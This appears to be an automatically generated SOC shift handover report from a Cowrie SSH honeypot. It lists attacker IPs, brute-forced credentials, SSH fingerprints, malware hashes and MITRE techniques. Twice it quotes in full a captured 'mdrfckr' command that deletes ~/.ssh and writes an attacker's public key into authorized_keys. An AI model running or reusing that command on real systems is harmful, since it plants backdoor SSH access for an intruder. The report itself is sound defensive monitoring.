# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T13:22:52Z |
| **Shift Time** | 13:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **71** |
| Confirmed Threats | **70** |
| False Positives Filtered | **1** (1.4%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **6** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **68** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **16** |
| Unique Credential Pairs | **16** |
| Unique Usernames | **13** |
| Unique Passwords | **16** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 3 |
| `user` | 2 |
| `deploy` | 1 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Frappe5` | 1 |
| `Host: 13.235.92.17:23` | 1 |
| `Accept: */*` | 1 |
| `` | 1 |
| `james` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `deploy` | `Frappe5` | 1 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 1 |
| `Accept-Encoding: gzip` | `` | 1 |
| `james` | `james` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123.QWER` | `117.50.51.119` | 2026-04-09T12:30:56 |
| `root` | `Qazwsx2021$` | `160.191.244.236` | 2026-04-09T12:34:03 |
| `root` | `3245gs5662d34` | `160.191.244.236` | 2026-04-09T12:34:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **71** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 32 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 31 | 7 |
| `16443846184e...` | Generic scanner | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 31 | 7 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `160.191.244.236`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 15 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (3)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a41aac7f8dc6

| Field | Detail |
|---|---|
| **Source IP** | `117.50.51[.]119` |
| **First Seen** | 2026-04-09 12:30 |
| **Last Seen** | 2026-04-09 12:31 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 12:30:55` | `cowrie.session.connect` |
| `2026-04-09 12:30:55` | `cowrie.client.version` |
| `2026-04-09 12:30:55` | `cowrie.client.kex` |
| `2026-04-09 12:30:56` | `cowrie.login.success` |
| `2026-04-09 12:30:57` | `cowrie.session.params` |
| `2026-04-09 12:30:57` | `cowrie.command.input` |
| `2026-04-09 12:30:57` | `cowrie.command.failed` |
| `2026-04-09 12:31:44` | `cowrie.log.closed` |
| `2026-04-09 12:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.51[.]119` to AbuseIPDB if not already reported
- [ ] Block `117.50.51[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a06b6a5d60

| Field | Detail |
|---|---|
| **Source IP** | `160.191.244[.]236` |
| **First Seen** | 2026-04-09 12:34 |
| **Last Seen** | 2026-04-09 12:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 12:34:02` | `cowrie.session.connect` |
| `2026-04-09 12:34:02` | `cowrie.client.version` |
| `2026-04-09 12:34:02` | `cowrie.client.kex` |
| `2026-04-09 12:34:03` | `cowrie.login.success` |
| `2026-04-09 12:34:03` | `cowrie.session.params` |
| `2026-04-09 12:34:03` | `cowrie.command.input` |
| `2026-04-09 12:34:03` | `cowrie.command.failed` |
| `2026-04-09 12:34:03` | `cowrie.log.closed` |
| `2026-04-09 12:34:03` | `cowrie.session.params` |
| `2026-04-09 12:34:03` | `cowrie.command.input` |
| `2026-04-09 12:34:03` | `cowrie.session.file_download` |
| `2026-04-09 12:34:03` | `cowrie.log.closed` |
| `2026-04-09 12:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.191.244[.]236` to AbuseIPDB if not already reported
- [ ] Block `160.191.244[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39e131d96b91

| Field | Detail |
|---|---|
| **Source IP** | `160.191.244[.]236` |
| **First Seen** | 2026-04-09 12:34 |
| **Last Seen** | 2026-04-09 12:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 12:34:05` | `cowrie.session.connect` |
| `2026-04-09 12:34:05` | `cowrie.client.version` |
| `2026-04-09 12:34:05` | `cowrie.client.kex` |
| `2026-04-09 12:34:06` | `cowrie.login.success` |
| `2026-04-09 12:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.191.244[.]236` to AbuseIPDB if not already reported
- [ ] Block `160.191.244[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `46.236.65[.]51` | **25** | 2026-04-09 11:09 | 2026-04-09 11:14 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.121[.]146` | **13** | 2026-04-09 10:56 | 2026-04-09 11:06 | 24m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.116[.]98` | **12** | 2026-04-09 12:34 | 2026-04-09 12:59 | 10m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.129.187[.]38` | **5** | 2026-04-09 11:42 | 2026-04-09 11:49 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `117.50.51[.]119` | **2** | 2026-04-09 12:31 | 2026-04-09 12:31 | 2m | 0 | `T1592` | 🟢 LOW |
| `165.245.175[.]148` | **2** | 2026-04-09 12:15 | 2026-04-09 12:17 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `1.30.199[.]218` | 1 | 2026-04-09 12:31 | 2026-04-09 12:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.173[.]59` | 1 | 2026-04-09 12:30 | 2026-04-09 12:30 | 4s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]231` | 1 | 2026-04-09 12:33 | 2026-04-09 12:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.76[.]140` | 1 | 2026-04-09 12:37 | 2026-04-09 12:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-04-09 12:45 | 2026-04-09 12:45 | 31s | 0 | `T1592` | 🟢 LOW |
| `160.191.244[.]236` | 1 | 2026-04-09 12:34 | 2026-04-09 12:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.206.156[.]151` | 1 | 2026-04-09 12:57 | 2026-04-09 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]204` | 1 | 2026-04-09 13:02 | 2026-04-09 13:03 | 31s | 1 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `165.245.175[.]148` | US | DigitalOcean, LLC | **100** ⚠️ | 16 |
| `18.206.156[.]151` | US | Amazon Technologies Inc. | **100** ⚠️ | 19 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `195.178.110[.]204` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 46 |
| `1.30.199[.]218` | CN | China unicom InnerMongolia province network | **100** ⚠️ | 50 |
| `14.103.121[.]146` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `46.236.65[.]51` | SE | Bredband2 AB | **100** ⚠️ | 29 |
| `106.12.173[.]59` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `160.191.244[.]236` | VN | Hoang Dieu Cloud Computing Company Limited | **100** ⚠️ | 27 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 34 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 11 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 71 cases |
| Tool 34  | Credential Extractor        | ✅ 16 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (1.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 3 priority case(s) shown individually · 14 recon entry/entries in table (6 group(s) consolidating 59 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T13:22:52Z_
